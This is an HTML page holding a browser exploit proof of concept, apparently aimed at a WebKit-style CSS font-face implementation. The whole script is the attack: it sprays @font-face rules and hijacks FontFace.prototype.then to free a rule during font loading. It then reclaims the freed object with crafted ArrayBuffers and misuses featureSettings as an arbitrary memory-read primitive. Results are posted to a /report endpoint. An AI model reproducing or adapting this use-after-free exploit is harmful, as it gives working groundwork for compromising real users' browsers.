<!doctype html><html><head><meta charset="utf-8"><title>CSF PROOF</title>
<style>body{margin:0;padding:16px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
#o{white-space:pre-wrap;font:13px/1.5 ui-monospace,monospace;color:#9fb4d6}
#s{font-size:40px;font-weight:700;color:#7fd6a8}</style></head>
<body><div id="s">CSF PROOF</div><pre id="o"></pre><script>
var out=document.getElementById("o"),LOG=[];
function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
function hx(o){return "0x"+("00000000"+(o.hi>>>0).toString(16)).slice(-8)+("00000000"+(o.lo>>>0).toString(16)).slice(-8);}
function hexb(b){var s="";for(var i=0;i<b.length;i++){s+=("0"+b[i].toString(16)).slice(-2)+" ";}return s;}

async function init_rw(){
  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null;
  var spray_rule="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
  var uaf_rule="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
  document.fonts.add(A); void A.loaded;
  var style=document.createElement("style"); document.head.append(style);
  for(var i=0;i<SPRAY/4;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
  var uaf_idx=style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
  for(var i=SPRAY/4;i<SPRAY;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
  void document.body.offsetHeight;
  var old_then=FontFace.prototype.then, fired=false;
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
    if(this!==A) return undefined;
    fired=true; log("UAF window: getter(A) fired");
    style.sheet.deleteRule(uaf_idx); void document.body.offsetHeight;
    for(var i=style.sheet.cssRules.length-1;i>=0;i--){ if(style.sheet.cssRules[i].cssText.indexOf("spray")!==-1) style.sheet.deleteRule(i); }
    void document.body.offsetHeight;
    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
    return undefined;}});
  var fonts=null; try{ fonts=await document.fonts.load("1em a, b","AB"); }catch(e){ log("load threw: "+e.message); }
  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old_then});
  if(!fonts||fonts.length!==2){ log("no UAF (fonts="+(fonts?fonts.length:"null")+")"); return null; }
  for(var i=0;i<fonts.length;i++){ if(fonts[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fonts[i]; break; } }
  for(var i=0;i<abs.length;i++){ var dv=new DataView(abs[i]); if(dv.getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
  log("UAF font="+(uaf_font?"FOUND":"none")+"  reclaimed AB="+(uaf_ab?"FOUND (refcount 2)":"none"));
  if(!uaf_font||!uaf_ab) return null;
  function setPtr(dv,off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
  function read(lo,hi,size){
    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), dv=new DataView(uaf_ab), o=0;
    while(o<size){
      setPtr(dv,OFF_FS,(lo+o)>>>0,hi);
      dv.setInt32(OFF_FS_SZ,1,true);
      dv.setInt32(OFF_FS_CAP,1,true);
      var s=uaf_font.featureSettings;
      for(var i=1;i<5 && o<size;i++) u8[o++]=s.charCodeAt(i)&0xff;
    }
    return ab;
  }
  return {font:uaf_font, ab:uaf_ab, read:read};
}

(async function(){
  log("UA: "+navigator.userAgent);
  var r=await init_rw(); if(!r){ log("no primitive"); return; }
  var dv=new DataView(r.ab);
  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
  log("CSSFontFace.m_wrapper = "+hx(wrap)+"  (heap)");
  // PROOF: read 32 bytes at the wrapper (known valid, seed-verified)
  try{
    var b=new Uint8Array(r.read(wrap.lo,wrap.hi,32));
    log("ARBITRARY READ @wrapper (32 B):");
    log("  "+hexb(b));
    log("PROOF: reclaimed CSSFontFace -> m_featureSettings -> real heap read");
  }catch(e){ log("read threw: "+e.message); }
  log("done");
})();
</script></body></html>
